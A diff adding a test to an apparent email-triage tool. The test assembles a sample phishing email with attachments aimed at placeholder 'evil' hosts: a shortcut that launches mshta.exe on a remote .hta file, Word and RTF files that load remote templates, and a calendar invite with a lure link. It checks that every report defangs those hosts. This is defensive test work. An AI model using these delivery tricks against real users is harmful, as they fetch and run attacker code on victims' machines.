@@ -210,3 +210,32 @@ def test_base64_encoded_authentication_results_are_read():
     raw = ("Received: from x.example by mx.acme-labs.example; Tue, 29 Sep 2026 10:00:00 +0000\r\n"
            "Authentication-Results: =?utf-8?B?%s?=\r\nFrom: a@x.example\r\nSubject: hi\r\n\r\nbody\r\n" % encoded)
     assert triage_bytes(raw.encode()).auth == {"spf": "temperror", "dkim": "fail", "dmarc": "fail"}
+
+
+# ------------------------------------------------------ 2.0: nothing live in any report --
+
+def test_no_report_shows_a_live_attacker_link():
+    """Links hide in QR payloads, shortcut command lines, remote templates,
+    invitations and PDF launch actions; every human-facing report must still
+    show each one defanged."""
+    import filebuild as fb
+
+    hosts = ["evil-lnk.top", "evil-template.top", "evil-invite.top", "evil-rtf.top", "evil-body.top"]
+    rels = (b'<Relationships><Relationship Id="r1" Type=".../attachedTemplate" '
+            b'Target="https://evil-template.top/t.dotm" TargetMode="External"/></Relationships>')
+    ics = ("BEGIN:VCALENDAR\r\nBEGIN:VEVENT\r\nORGANIZER:mailto:x@evil-invite.top\r\n"
+           "DESCRIPTION:join https://evil-invite.top/meet\r\nEND:VEVENT\r\nEND:VCALENDAR\r\n")
+    raw = build_eml(text="Open https://evil-body.top/login", attachments=[
+        (fb.lnk(target="C:\\Windows\\System32\\mshta.exe", arguments="https://evil-lnk.top/a.hta"),
+         "application", "octet-stream", "scan.lnk"),
+        (fb.plain_zip({"[Content_Types].xml": b"<Types/>", "word/_rels/settings.xml.rels": rels}),
+         "application", "octet-stream", "cv.docx"),
+        (b"{\\rtf1{\\*\\template https://evil-rtf.top/t.dot}}", "application", "rtf", "a.rtf"),
+        (ics.encode(), "text", "calendar", "invite.ics")])
+    a = triage_bytes(raw)
+    rendered = {"console": console.render(a, console.Palette(False), verbose=True),
+                "html": html.render([a]), "markdown": markdown.render(a)}
+    for name, text in rendered.items():
+        for host in hosts:
+            assert host not in text, "%s shows %s undefanged" % (name, host)
+            assert host.replace(".", "[.]") in text, "%s never mentions %s" % (name, host)
